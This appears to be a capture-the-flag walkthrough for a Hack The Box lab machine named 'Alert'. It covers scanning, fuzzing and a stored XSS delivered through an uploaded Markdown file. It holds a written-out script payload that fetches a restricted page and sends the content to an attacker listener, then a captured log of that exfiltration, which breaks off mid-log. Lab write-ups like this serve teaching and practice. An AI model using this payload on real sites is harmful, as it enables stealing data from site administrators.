# Alert

- IP: 10.10.11.44

## Nmap

```
➜  alert sudo nmap -sS -sU -vv 10.10.11.44
```

```shell
Discovered open port 22/tcp on 10.10.11.44
Discovered open port 80/tcp on 10.10.11.44
```

## /etc/hosts

The following is added to the /etc/hosts file in order to be able to resolve it.

```
10.10.11.44 alert.htb
```

Upon visiting http://alert.htb/, the following page is displayed.  

## Fuzzing

To further map out the target, a fuzzer was started in the background while poking around the different pages that were readily available.

```shell
➜  alert ffuf -recursion -u http://alert.htb/FUZZ -w ~/repos/SecLists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://alert.htb/css/FUZZ
index.php               [Status: 302, Size: 659, Words: 123, Lines: 24]
messages                [Status: 301, Size: 309, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://alert.htb/messages/FUZZ
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 308, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://alert.htb/uploads/FUZZ
[INFO] Scanning: http://alert.htb/css/FUZZ
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10]
style                   [Status: 200, Size: 3622, Words: 676, Lines: 183]
[INFO] Scanning: http://alert.htb/messages/FUZZ
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
[INFO] Scanning: http://alert.htb/uploads/FUZZ
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
:: Progress: [4744/4744] :: Job [4/4] :: 103 req/sec :: Duration: [0:00:46] :: Errors: 0 ::

```

The fuzzer recognized a few interesting links

- http://alert.htb/messages
- http://alert.htb/server-status
- http://alert.htb/uploads

all of which returned `403 Forbidden`, which is an indicator that they exist but that we lack the necessary permissions to visit them.

## Investigating the file upload feature

Since we are allowed to upload .md files, and the name of the htb target is 'alert.htb', an .md file with the following contents was uploaded.

```text
<script>alert(1)</script>
```

Which when browsed pops an alert message.  

Great. We have XSS.

Since there's also a "contact us" page, this seemed like a good entrypoint for sharing a malicious link in hope that a site administrator visits it.

An anedcdote here is that many attempts were made to get things such as the cookie. 
Since the cookie didn't seem to be set, another approach was taken: namely to attempt to retrieve a restricted page.

Pages found by `ffuf`:

- **/messages/**
- **/system-status/**
- **/uploads/**

The payload devised for the `.md` file looks as follows.

```
<script>document.body.innerHTML='<h1>Loading...</h1>';fetch('http://alert.htb/index.php?page=<restricted-page>').then(response=>response.text()).then(data=>fetch('http://<attacker-ip>:<attacker-ip>/log.php?content='+encodeURIComponent(data))).catch(error=>fetch('http://<attacker-ip>:<attacker-port>/log.php?error='+encodeURIComponent(error.message)));setTimeout(()=>{window.location.href='http://alert.htb/';}, 3001);</script>

```

The reason a timeout of 3 seconds was added is so that there is adequate time to retrieve the sharing link before the other page was displayed. *(Just right-click and view page source before it loads to see the link, or click on the share button in the bottom right corner.)*

A netcat listener is setup with  
`nc -lvnp 4441 -k`, and the file is uploaded. The page then looks like:  
  
And the sharing link  
`http://alert.htb/visualizer.php?link_share=67b9831122ac15.36502749.md`.

The link is then shared through the contact page.  

Finally, the netcat listener captured the traffic:

```
$ nc -lvnp 4441 -k
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4441
Ncat: Listening on 0.0.0.0:4441
Ncat: Connection from 10.10.16.14.
Ncat: Connection from 10.10.16.14:35060.
GET /log.php?content=%3C!DOCTYPE%20HTML%20PUBLIC%20%22-%2F%2FIETF%2F%2FDTD%20HTML%202.0%2F%2FEN%22%3E%0A%3Chtml%3E%3Chead%3E%0A%3Ctitle%3E403%20Forbidden%3C%2Ftitle%3E%0A%3C%2Fhead%3E%3Cbody%3E%0A%3Ch1%3EForbidden%3C%2Fh1%3E%0A%3Cp%3EYou%20don%27t%20have%20permission%20to%20access%20this%20resource.%3C%2Fp%3E%0A%3Chr%3E%0A%3Caddress%3EApache%2F2.4.41%20(Ubuntu)%20Server%20at%20alert.htb%20Port%2080%3C%2Faddress%3E%0A%3C%2Fbody%3E%3C%2Fhtml%3E%0A HTTP/1.1
Host: 10.10.16.14:4441
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Origin: http://alert.htb
Referer: http://alert.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

Ncat: Connection from 10.10.11.44.
Ncat: Connection from 10.10.11.44:37980.
GET /log.php?content=%3C!DOCTYPE%20HTML%20PUBLIC%20%22-%2F%2FW3C%2F%2FDTD%20HTML%203.2%20Final%2F%2FEN%22%3E%0A%3Chtml%3E%3Chead%3E%0A%3Ctitle%3EApache%20Status%3C%2Ftitle%3E%0A%3C%2Fhead%3E%3Cbody%3E%0A%3Ch1%3EApache%20Server%20Status%20for%20alert.htb%20(via%20127.0.0.1)%3C%2Fh1%3E%0A%0A%3Cdl%3E%3Cdt%3EServer%20Version%3A%20Apache%2F2.4.41%20(Ubuntu)%3C%2Fdt%3E%0A%3Cdt%3EServer%20MPM%3A%20prefork%3C%2Fdt%3E%0A%3Cdt%3EServer%20Built%3A%202024-07-17T18%3A58%3A09%0A%3C%2Fdt%3E%3C%2Fdl%3E%3Chr%20%2F%3E%3Cdl%3E%0A%3Cdt%3ECurrent%20Time%3A%20Saturday%2C%2022-Feb-2025%2007%3A57%3A17%20UTC%3C%2Fdt%3E%0A%3Cdt%3ERestart%20Time%3A%20Saturday%2C%2022-Feb-2025%2004%3A46%3A53%20UTC%3C%2Fdt%3E%0A%3Cdt%3EParent%20Server%20Config.%20Generation%3A%201%3C%2Fdt%3E%0A%3Cdt%3EParent%20Server%20MPM%20Generation%3A%200%3C%2Fdt%3E%0A%3Cdt%3EServer%20uptime%3A%20%203%20hours%2010%20minutes%2023%20seconds%3C%2Fdt%3E%0A%3Cdt%3EServer%20load%3A%200.00%200.00%200.00%3C%2Fdt%3E%0A%3Cdt%3ETotal%20accesses%3A%205962%20-%20Total%20Traffic%3A%203.5%20MB%20-%20Total%20Duration%3A%202826%3C%2Fdt%3E%0A%3Cdt%3ECPU%20Usage%3A%20u.22%20s.34%20cu.49%20cs.32%20-%20.012%25%20CPU%20load%3C%2Fdt%3E%0A%3Cdt%3E.522%20requests%2Fsec%20-%20325%20B%2Fsecond%20-%20623%20B%2Frequest%20-%20.474002%20ms%2Frequest%3C%2Fdt%3E%0A%3Cdt%3E2%20requests%20currently%20being%20processed%2C%208%20idle%20workers%3C%2Fdt%3E%0A%3C%2Fdl%3E%3Cpre%3E..............._.K......_......__....._............._...W.......%0A_._.............................................................%0A......................%3C%2Fpre%3E%0A%3Cp%3EScoreboard%20Key%3A%3Cbr%20%2F%3E%0A%22%3Cb%3E%3Ccode%3E_%3C%2Fcode%3E%3C%2Fb%3E%22%20Waiting%20for%20Connection%2C%20%0A%22%3Cb%3E%3Ccode%3ES%3C%2Fcode%3E%3C%2Fb%3E%22%20Starting%20up%2C%20%0A%22%3Cb%3E%3Ccode%3ER%3C%2Fcode%3E%3C%2Fb%3E%22%20Reading%20Request%2C%3Cbr%20%2F%3E%0A%22%3Cb%3E%3Ccode%3EW%3C%2Fcode%3E%3C%2Fb%3E%22%20Sending%20Reply%2C%20%0A%22%3Cb%3E%3Ccode%3EK%3C%2Fcode%3E%3C%2Fb%3E%22%20Keepalive%20(read)%2C%20%0A%22%3Cb%3E%3Ccode%3ED%3C%2Fcode%3E%3C%2Fb%3E%22%20DNS%20Lookup%2C%3Cbr%20%2F%3E%0A%22%3Cb%3E%3Ccode%3EC%3C%2Fcode%3E%3C%2Fb%3E%22%20Closing%20connection%2C%20%0A%22%3Cb%3E%3Ccode%3EL%3C%2Fcode%3E%3C%2Fb%3E%22%20Logging%2C%20%0A%22%3Cb%3E%3Ccode%3EG%3C%2Fcode%3E%3C%2Fb%3E%22%20Gracefully%20finishing%2C%3Cbr%20%2F%3E%20%0A%22%3Cb%3E%3Ccode%3EI%3C%2Fcode%3E%3C%2Fb%3E%22%20Idle%20cleanup%20of%20worker%2C%20%0A%22%3Cb%3E%3Ccode%3E.%3C%2Fcode%3E%3C%2Fb%3E%22%20Open%20slot%20with%20no%20current%20process%3Cbr%20%2F%3E%0A%3C%2Fp%3E%0A%0A%0A%3Ctable%20border%3D%220%22%3E%3Ctr%3E%3Cth%3ESrv%3C%2Fth%3E%3Cth%3EPID%3C%2Fth%3E%3Cth%3EAcc%3C%2Fth%3E%3Cth%3EM%3C%2Fth%3E%3Cth%3ECPU%0A%3C%2Fth%3E%3Cth%3ESS%3C%2Fth%3E%3Cth%3EReq%3C%2Fth%3E%3Cth%3EDur%3C%2Fth%3E%3Cth%3EConn%3C%2Fth%3E%3Cth%3EChild%3C%2Fth%3E%3Cth%3ESlot%3C%2Fth%3E%3Cth%3EClient%3C%2Fth%3E%3Cth%3EProtocol%3C%2Fth%3E%3Cth%3EVHost%3C%2Fth%3E%3Cth%3ERequest%3C%2Fth%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E0-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F211%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3764%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E949%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.14%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E1-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F206%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3779%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E49%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.14%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E2-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F211%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3777%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E171%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.16%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E3-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F241%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3728%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E129%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.17%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E4-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F210%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3766%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E133%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.14%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E5-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F225%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3765%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E58%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.16%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E6-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F199%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3768%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E48%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.13%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E7-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3776%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E8-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F114%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3753%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E13%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E9-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F114%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3759%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E13%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E10-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3775%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E13%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E11-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F98%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3740%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E12-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F115%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3746%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E13%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E13-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3730%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E14-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3734%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E15-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3272%3C%2Ftd%3E%3Ctd%3E0%2F159%2F159%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E26%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E34%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.11%3C%2Ftd%3E%3Ctd%3E0.11%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Findex.php%3Fpage%3Dcontact%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E16-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3773%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E17-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3274%3C%2Ftd%3E%3Ctd%3E2%2F148%2F148%3C%2Ftd%3E%3Ctd%3E%3Cb%3EK%3C%2Fb%3E%0A%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E239%3C%2Ftd%3E%3Ctd%3E2.3%3C%2Ftd%3E%3Ctd%3E0.10%3C%2Ftd%3E%3Ctd%3E0.10%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Findex.php%3Fpage%3Dcontact%26amp%3Bstatus%3DMessage%2520sent%2520successfull%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E18-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F113%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3735%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E14%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E19-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3772%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E10%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E20-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F101%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3732%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E21-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3736%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%